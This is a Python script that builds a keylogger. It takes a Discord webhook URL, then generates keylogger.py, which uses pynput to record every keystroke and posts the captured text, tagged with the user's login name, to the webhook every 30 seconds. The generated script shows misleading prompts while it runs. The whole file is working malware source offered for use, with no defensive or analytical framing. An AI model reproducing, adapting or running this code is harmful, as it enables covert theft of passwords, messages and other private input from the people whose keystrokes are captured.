import os
import re
import subprocess
import sys

def get_username():
    return os.getlogin()

def is_valid_webhook(url):
    pattern = r'^https://discord\.com/api/webhooks/\d+/[\w-]+$'
    return re.match(pattern, url) is not None

def build_keylogger(webhook):
    username = get_username()
    template = f'''
import os
import time
import requests
from pynput import keyboard

webhook = "{webhook}"
pc_user = "{username}"
current_line = ""

def send_logs(logs):
    try:
        data = {{"content": f"**{{pc_user}}**\\n```\\n{{logs}}\\n```"}}
        requests.post(webhook, json=data)
    except:
        pass

def on_press(key):
    global current_line
    try:
        if key == keyboard.Key.enter:
            current_line += "\\n"
        elif key == keyboard.Key.space:
            current_line += " "
        elif key == keyboard.Key.backspace:
            current_line = current_line[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            current_line += key.char
        else:
            current_line += f" [{{key}}] "
    except:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

print(f"Hello {{pc_user}}")
print("(+) Loaded Successfully… Please input your webhook url:")
# Webhook already embedded, starting logger...
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        time.sleep(30)
        if current_line.strip():
            send_logs(current_line)
            current_line = ""
        if not listener.running:
            break
'''
    with open("keylogger.py", "w") as f:
        f.write(template)
    print(f"[+] Built keylogger.py for user: {username}")
    print("[+] Run it with: python keylogger.py (requires pynput and requests)")

if __name__ == "__main__":
    print(f"Hello {get_username()}")
    print("(+) Loaded Successfully… Please input your webhook url:")
    url = input().strip()
    if not is_valid_webhook(url):
        print("This is not a webhook buddy!")
        sys.exit(1)
    build_keylogger(url)
